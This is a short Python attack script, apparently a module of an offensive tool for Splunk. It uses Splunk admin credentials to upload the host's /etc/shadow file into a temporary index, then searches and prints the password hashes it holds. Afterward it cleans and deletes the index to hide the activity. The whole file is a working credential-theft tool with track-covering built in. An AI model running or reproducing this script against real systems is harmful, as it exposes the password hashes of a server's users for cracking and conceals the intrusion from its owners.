#!/usr/bin/env python3

# In Linux installations read /etc/shadow file from the host where Splunk is installed

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import getpass
import logging
import splunklib.client as client
import splunklib.results as results
import sys

sys.path.append('../')

# %%%%%%%%%%%% Constants %%%%%%%%%%%%%#

SEPARATOR = "[*] {0} [*]".format('=' * 110)

# %%%%%%%%%%% Functions %%%%%%%%%%%#

def read_file(splunkServer):

	splunkAdmin = input("[!] Enter Splunk Admin (Default admin): ")
	splunkPassword = getpass.getpass("[!] Enter Splunk Password: ")

	splunkService = client.connect(host = splunkServer, port = 8089, username = splunkAdmin,
									password = splunkPassword)

	name = "siemsfworkidx"

	if name not in splunkService.indexes:
		siemsfworkidx = splunkService.indexes.create("siemsfworkidx")
	else:
		siemsfworkidx = splunkService.indexes[name]

	# Splunk can be installed on debian, centos, ubuntu and redhat, the shadow file is /etc/shadow

	uploadfile = "/etc/shadow"
	siemsfworkidx.upload(uploadfile)

	print(SEPARATOR)
	print("[!] File /etc/shadow uploaded")
	print(SEPARATOR)
	print("[!] Shadow File Contents:")
	print(SEPARATOR)

	# the file is uploaded in the index siemsfworkidx, the count=0 is for returning all events

	searchquery_oneshot = "search index = siemsfworkidx | stats list(_raw)"
	kwargs_oneshot = {"output_mode": "csv", "count": 0}
	oneshotsearch_results = splunkService.jobs.oneshot(searchquery_oneshot, **kwargs_oneshot)
	results = str(oneshotsearch_results.read())
	data = results.replace('"', '')
	data2 = data.replace('list(_raw)', '')
	shadow = data2.split(' ')

	for i in shadow:
		if not i.startswith('\n'):
			print("[*] " + i)
		else:
			print("[*] " + i.replace('\n', ''))

	print(SEPARATOR)
	print("[!] Please wait a few seconds for the index to be cleaned and deleted [!]")

	timeout = 60
	siemsfworkidx.clean(timeout)
	siemsfworkidx.delete()

# %%%%%%%%%% The End %%%%%%%%%%#
